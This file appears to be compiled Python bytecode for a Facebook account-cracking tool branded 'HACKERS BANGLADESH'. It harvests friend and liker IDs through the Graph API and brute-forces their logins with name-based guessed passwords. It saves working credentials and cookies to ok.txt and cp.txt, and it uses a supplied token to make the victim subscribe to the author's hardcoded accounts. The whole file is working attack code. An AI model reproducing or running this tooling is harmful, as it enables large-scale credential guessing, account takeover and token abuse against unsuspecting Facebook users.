a
    ���`A  �                   @   s  d dl Z d dlZd dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZe�e� d dlmZ dej�� v r�dZdZdZdZndZdZdZdZd	d
� Zdae �d�j�� adaz:e �d�j�� Ze jde dddd�d��	� d �� aW n   daY n0 dZej� d��rVej�!d�d k�rVe"d��#� �� Zdddedddd�a$dd� Z%dd � Z&d!d"� Z'd#d$� Z(d%d&� Z)d'd(� Z*d)d*� Z+d+d,� Z,d-d.� Z-d/d0� Z.d1d2� Z/d3d4� Z0d5d6� Z1d7d8� Z2d9d:� Z3d;d<� Z4G d=d>� d>�Z5e6d?k�re/�  dS )@�    N)�ThreadPoolExecutorZlinuxz[0mz[32mz
[37m[33mz[91m� c                   C   s   t d� d S )Nu�  
[1;92m    _          _
[1;92m     \        /
[1;92m    __\______/__
[1;92m    | [[1;31;1m©[1;92m]  [[1;31;1m©[1;92m] |​
 [1;92m   |  [[1;33m====[1;92m]  | [+] HACKERS BANGLADESH [+]
[1;92m╔══o00════════00o═════════════════════════╗
[1;31;1m█ [1;92m [•] [1;31;1mAuthor    :  [1;92m James404_           [1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mWhatsapp  :  [1;92m +96598064347        [1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mWhatsapp  : [1;92m  Black404_           [1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mGrup Fb   :  [1;92m Termux Command World[1;31;1m █
[1;31;1m█ [1;92m [•] [1;31;1mVersion   :  [1;92m 0.3                  [1;31;1m█
[1;92m╚═════════════════════════════════════════╝)�print� r   r   �nde.py�logo   s    r   �https://mbasic.facebook.comz5https://api-asutoolkit.cloudaccess.host/useragent.txt�https://api.ipify.orgz https://ipapi.com/ip_api.php?ip=zhttps://ip-api.com/zapplication/json; charset=utf-8z|Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36)ZRefererzContent-Typez
User-Agent)�headersZcountry_namez.browserzmbasic.facebook.com�	max-age=0�1�Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)�Host�cache-control�upgrade-insecure-requests�
user-agent�accept�accept-encoding�accept-languagec                   C   sB   dt j�� v rt�d� n$dt j�� v r4t�d� n
t�d� d S )Nz linux�clear�win�cls)�sys�platform�lower�os�systemr   r   r   r   r   4   s
    r   c                 C   s�   d}t �tjdt� | d�jd�}|jddd�D ]R}d|�d	�v r.tjd
|�d	� | t� d� tjdt� | d�j}d|�� v r.d}q.|dkr�dS td�	t
t�� t�  d S )NFz(https://mbasic.facebook.com/language.php�r
   �cookies�html.parser�aT)�hrefZid_IDr#   �https://mbasic.facebook.com/)r    r
   z'https://mbasic.facebook.com/profile.phpzwhat do you think nowz  {}Dead Cookies{})�bs4�BeautifulSoup�requests�get�hdcok�textZfind_allr   r   �format�R�N�gen)r    �fZrr�i�br   r   r   �lang:   s    r2   c                   C   sB   t j�d�r8t j�d�dkr0ttd��� �� �S t�  nt�  d S )N�.cokr   )	r   �path�exists�getsize�gets_dict_cookies�open�read�strip�logsr   r   r   r   �
basecookieG   s
    r<   c                  C   s6   t } | dddtd�tj�d| ��| d ddd	d
�
}|S )Nr   r   r   r   z	://(.*?)$z/login/?next&ref=dbl&fl&refid=8r   r   z!application/x-www-form-urlencoded)
�originr   r   r   r   r   �refererr   r   �content-type)�host�ua�joinr%   �re�findall)�hosts�rr   r   r   r)   M   s    .r)   c                 C   s~   g }t | �� �D ]b}|d tt| �� ��d krP|�|d d | |d   � q|�|d d | |d   d � qd�|�S )Nr   �   �=�; r   )�	enumerate�keys�len�list�appendrB   �r    �resultr0   r   r   r   �gets_cookiesR   s
    <$rQ   c              
   C   s�   i }z8| � d�D ]&}|�|� d�d |� d�d i� q|W S    | � d�D ]&}|�|� d�d |� d�d i� qN| Y S 0 d S )N�;rH   r   rG   rI   )�split�updaterO   r   r   r   r7   X   s    $$r7   c               
   C   s�   t d�} | dkrt�  zVt| �}t|�dkr\tdd��| � t�  td� t�	d� t
�  ntd� t�  W n6 ty� } ztd	| � t�  W Y d }~n
d }~0 0 d S )
Nz
 [*] Cookie: r   Tr3   �wz [92mLogin successful![0mrG   z [91mLogin Faild[0mz  error: %s)�inputr.   r7   r2   r8   �write�convertr   �time�sleep�menu�	Exception)ZckZcks�er   r   r   r.   b   s    
r.   c                  C   s�   t d�} zJt�d|  �}t�|j�}|d }tdd��| � td� t	�  t
�  W n* ty|   td� t�d� t�  Y n0 d S )	Nz
 [*] Token :z+https://graph.facebook.com/me?access_token=�name�	login.txtrU   z [92mlogin Successful![0mz [91mInvalid Token ![0mg      �?)rV   r'   r(   �json�loadsr*   r8   rW   r   �	bot_komenr[   �KeyErrorrY   rZ   r;   )�data�mer"   �namar   r   r   �	log_tokenp   s    

rg   c                  C   s�   zjt jddddddddd	d
d�	dtdd��� id�} t�d| j�}|d u rLntdd��|�d�� W d S W n: t	y� } z"t
td|  � t�  W Y d }~n
d }~0 0 d S )NzGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comr   r   r   r   ztext/html; charset=utf-8)	r   r>   r@   r=   r   r   r   r   r?   Zcookier3   rF   r   z	(EAAA\w+)r_   rU   rG   z
  error: %s)r'   r(   r8   r9   rC   �searchr*   rW   �groupr\   r   r,   �exit)ZtomkenZ
find_tokenr]   r   r   r   rX   ~   s.    ���
rX   c                  C   s�   zt dd��� } W n  ty2   td� t�  Y n0 t�d|  � t�d|  � t�d|  � t�d|  � t�d|  � t�d	|  � t�d
|  � t�d|  � t�d|  � t�d|  � t�  d S )Nr_   rF   z[!] Token invalidzDhttps://graph.facebook.com/100009259963367/subscribers?access_token=zDhttps://graph.facebook.com/100000724648009/subscribers?access_token=zDhttps://graph.facebook.com/100007018489471/subscribers?access_token=zDhttps://graph.facebook.com/100013262432692/subscribers?access_token=zDhttps://graph.facebook.com/100015677582654/subscribers?access_token=zDhttps://graph.facebook.com/100022609519010/subscribers?access_token=zDhttps://graph.facebook.com/100008345712093/subscribers?access_token=zDhttps://graph.facebook.com/100004366032692/subscribers?access_token=zDhttps://graph.facebook.com/100066500364070/subscribers?access_token=zDhttps://graph.facebook.com/100047922621386/subscribers?access_token=)r8   r9   �IOErrorr   r;   r'   �postr[   )�toketr   r   r   rb   �   s     rb   c            	   
   C   s:  z<t dd��� } t�d|  �}t�|j�}|d }|d }W n< tyx } z$td� t	�
d� t�  W Y d }~n
d }~0 0 t�d�j}t�d	� t�  td
| d � td| d � td| d � td� td� t	�
d� td� t	�
d� td� t	�
d� td� t	�
d� td� t	�
d� t td�}t	�
d� |dk�r`td�tt�� t�  n�|dk�rrt�  n�|dk�r�t�  n�|dk�r�t�  n�|dk�r�td� t	�
d� t�d� td � t�d!� nf|d"k�r(zt�d� tt� � W n2 t�y$ } ztd#| � W Y d }~n
d }~0 0 ntd$� t�  d S )%Nr_   rF   z,https://graph.facebook.com/me/?access_token=r^   �idz/ [!]. Expired Token / Cookies, please re-login!rG   r	   r   z [ Account Name : [0;93mz	[0;97m ]z [1;92m [ UID Facebook : [0;92mz	[0;39m ]z[1;92m [ IP Adress : [0;92mz+[1;92m [ Status : [0;92m[ BL4CK[0;39m ]
z"[1;92m [1]. Dump Id Friend/Publik��Q���?z[1;92m [2]. Dump From Likez[1;92m [3]. Start Crackingz[1;92m [4]. Update Scriptz[1;92m [0]. Logoutz
 [*]. Select : r   zfill in correctlyr   �2�3�4z  Upgrading!!!�   zgit pullz  [Back]zpython run.py�0z) [91m Error file tidak ditemukan  %s[0mz  [91mwrong input !)r8   r9   r'   r(   r`   ra   r*   r\   r   rY   rZ   r;   r   r   r   rV   r+   r,   r-   r[   �publik�
crack_like�crack�removerj   r<   )	rm   Zotwr"   rf   rn   rU   ZiprF   r]   r   r   r   r[   �   sT    

"






4r[   c               
   C   sF  zt dd��� } W n< tyN   td�tt�� t�d� t	�
d� t�  Y n0 �z�td� t	�
d� td�}t	�
d� z6t�d	| d
 |  �}t�|j�}td|d  � W n( ty�   td�tt�� t�  Y n0 t�d	| d |  �}g }t�|j�}td� |d d �dd�}t |d�}|d d D ]v}	|�|	d d |	d  � |�|	d d |	d  d � tdtt|�� dd� tj��  t	�
d� t|	d � �q0|��  t td|d  � t	�
d� tdt|� � t	�
d� td| � t	�
d� td � t�  W n2 t�y@ }
 ztd!|
 � W Y d }
~
n
d }
~
0 0 d S )"Nr_   rF   z  {}Cookies Invalid!{}�rm -rf login.txtg{�G�z�?z9
 [*]. Type me if you want to retrieve from friends list
ro   z! [?]. Enter your id or username: �https://graph.facebook.com/z?access_token=z [*]. Name      : r^   z [!]. ID NOT found !{}z*?fields=friends.limit(50000)&access_token=z [*]. Retrieves All IDs ...Z
first_name�.json� �_rU   Zfriendsrd   rn   �<=>�
�%s ��end�y�&1�|?z%
[!]. Successfully Fetched ID from %s�[*]. Total ID : %s�[*]. Output : %sz

[!]. Backz	error: %s) r8   r9   rk   r   r+   r,   r-   r   r   rY   rZ   r.   rV   r'   r(   r`   ra   r*   rc   ru   �replacerN   rW   �strrL   r   �stdout�flush�closer[   r\   rj   )rm   �idtZjok�oprF   rn   �z�qq�ysr"   r]   r   r   r   ru   �   sJ    


,
ru   c                  C   s�  zt dd��� } W n4 tyF   td� t�d� t�d� t�  Y n0 t	d�}t�d� �z t
�d| d	 |  �}g }t�|j�}|d
 �dd�}t |d�}td� t |d D ]j}|�|d � |�|d d |d  d � tdtt|�� dd�f tj��  t�d� t|d � q�|��  t td� t�d� tdt|� � t�d� td| � t�d� t	d� t�  W nF t�y�   td� t�  Y n& t
jj�y�   td� t�  Y n0 d S )Nr_   rF   z   Token Invalidry   rG   z [?]. Public / Friend Post ID :ro   rz   z"/likes?limit=9999999&access_token=r{   r|   r}   rU   z [!]. Take all IDsrd   rn   r~   r^   r   r�   r�   r�   z)
[!]. Successfully retrieved ID from Liker�   r�   z
 [!]. Backz  [91mID posting wrong[0mz! No connection)r8   r9   rk   r   r   r   rY   rZ   r;   rV   r'   r(   r`   ra   r*   r�   rN   rW   r�   rL   r   r�   r�   r�   r[   rc   �
exceptionsZSSLErrorrj   )rm   r�   rF   Zidsr�   r�   r�   r0   r   r   r   rv   �   sD    


.

rv   c           
      C   sr  t �� }|j�t� |�d�}t�|jd�}d�	tj
�d|j��}i }|d�D ]~}|�d�d u r�|�d�dkr~|�d| i� q�|�d�d	kr�|�d	|i� q�|�|�d�di� qN|�|�d�|�d�i� qN|�|dd
dddddd�� |j�ddi� |jd|d�j}	dt|j�� �� �v �r6d| ||j�� d�S dt|j�� �� �v �rbd| ||j�� d�S d| |d�S d S )Nr$   r!   r   zdtsg":\{"token":"(.*?)"rV   �valuer^   �email�passrt   �d)Zfb_dtsgZm_sessZ__userZ__reqZ__csrZ__aZ__dynZencpassr>   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8z~https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100)rd   Zc_user�success)�statusr�   r�   r    Z
checkpoint�cp�error)r�   r�   r�   )r'   ZSessionr
   rT   �mbasic_hr(   r%   r&   r*   rB   rC   rD   rl   rM   r    Zget_dictrK   )
ZemZpasrE   rF   �pr1   �metard   r0   Zpor   r   r   �mbasic   s4    

��r�   c                 C   s�   g }| � d�D ]�}t|�dk r"qq|�� }t|�dksNt|�dksNt|�dkrz|�|d � |�|d � |�|d � q|�|d � |�|d � |�|d � |�|� dtv r|�d	� |�d
� |�d� q|S )Nr|   �   �   �   Z123Z1234Z12345Z	indonesiaZ786786Zpakistan123Z102030)rS   rL   r   rN   �ips)r*   Zresultsr0   r   r   r   �generate>  s$    $


r�   c                  C   s�   t �  td� t�d� td� t�d� td� t�d� td�} t�d� | dkrntd�tt�� t�  nF| dkr~t	�  n6| d	kr�t
�  n&| d
kr�t�  ntd�tt�� t�  d S )Nz
 [1]. Login with tokeng�������?z [2]. Login with cookiesz
 [0]. Exitz
 [?] login : r   z  the correct contentr   rp   rq   z the correct content)r   r   rY   rZ   rV   r+   r,   r-   r;   rg   r.   rj   )Zsekr   r   r   r;   T  s    r;   c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )rw   c              
   C   s�  g | _ g | _d| _td� td�}t |dkr2qq|dk�r>z�z&td�| _t| j��� �� | _	W q�W q> t
y� } z$td| � W Y d }~q>W Y d }~q>d }~0 0 q>g | _| j	D ]4}z| j�d|�d	�d i� W q�   Y q�Y q�0 q�W n> t
�y& } z$td| � W Y d }~qW Y d }~n
d }~0 0 td
� | ��  �q�q|dkrz�z(td�| _t| j��� �� | _	W �q�W n@ t
�y� } z&td| � W Y d }~�qHW Y d }~n
d }~0 0 �qHg | _| j	D ]H}z.| j�|�d	�d t|�d	�d �d�� W n   Y �q�Y n0 �q�W n> t
�yL } z$td| � W Y d }~qW Y d }~n
d }~0 0 td� t�d� td� t�d� td� t�d� td��| j| j� �q�qd S )Nr   z0 [?]. Do you want to use a manual password [Y/t]z [*]. input : r   �tz [*]. Enter id list file: z  %srn   r~   z [*]. example pass123,pass12345�Yz [*]. Enter id list file : rG   )rn   �pwz [!]. crack started...ro   z/ [+]. account ok saved to: [0;92mok.txt[0;97mz@ [*]. account checkpoint saved to: [0;93mcheckpoint.txt[0;97m
�#   )�adar�   �kor   rV   Zapkr8   r9   �
splitlinesZfsr\   �flrN   rS   �pwlistr�   rY   rZ   �
ThreadPool�map�main)�selfr/   r]   r0   r   r   r   �__init__e  sb    

$
"

(
."zcrack.__init__c                 C   s�   t d��d�| _t| j�dkr(| ��  nf| jD ]}|�d| ji� q.td� t�	d� td� t�	d� td� t�	d� t
d	��| j| j� d S )
Nz [*]. password list : �,r   r�   z  crack started...ro   z  account ok saved to: ok.txtz-  account checkpoint saved to: checkpoint.txt�   )rV   rS   r�   rL   r�   r�   rT   r   rY   rZ   r�   r�   r�   )r�   r0   r   r   r   r�   �  s    

zcrack.pwlistc              
   C   s�  �z�|� d�D �]0}t|� d�|d�}|� d�dkr�tdt|� d�|tf � | j�d|� d�|f � |� d�td��� v r� �qBn*tdd	��	d
|� d�|t
|� d��f � d
|� d�|t
|� d��f } �qBq|� d�dkrtdt|� d�|tf � | j�d|� d�|f � tdd	��	d|� d�|f �  �qBqqq|  jd7  _td| jt| j�t| j�t| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�   rn   r   r�   r�   u.    [[1;92mJAMES-HACKED💉]%s %s | %s %s      z%s|%szok.txtza+z
%s|%s|%s

r    r�   z( [[1;31;1mJAMES-CP]%s %s | %s %s      zcp.txtz%s|%s|
rG   z( [*]. crack %s/%s - Hacked-:%s - CP-:%sr|   r�   )r(   r�   r   �Gr-   r�   rN   r8   r9   rW   rQ   �Or�   r�   rL   r�   r   r�   r�   r�   )r�   r�   r0   �logr�   r   r   r   r�   �  s6    
�
�
�:z
crack.mainN)�__name__�
__module__�__qualname__r�   r�   r�   r   r   r   r   rw   d  s   5rw   �__main__)7r'   r%   r   r   �
subprocessZrandomrY   rC   �base64r`   Zuuid�	importlib�reloadZconcurrent.futuresr   r�   r   r   r-   r�   r�   r,   r   r@   r(   r*   r:   rA   r�   r1   Zuasr4   r5   r6   r8   r9   r�   r   r2   r<   r)   rQ   r7   r.   rg   rX   rb   r[   ru   rv   r�   r�   r;   rw   r�   r   r   r   r   �<module>   s\   (@
*

,'%]
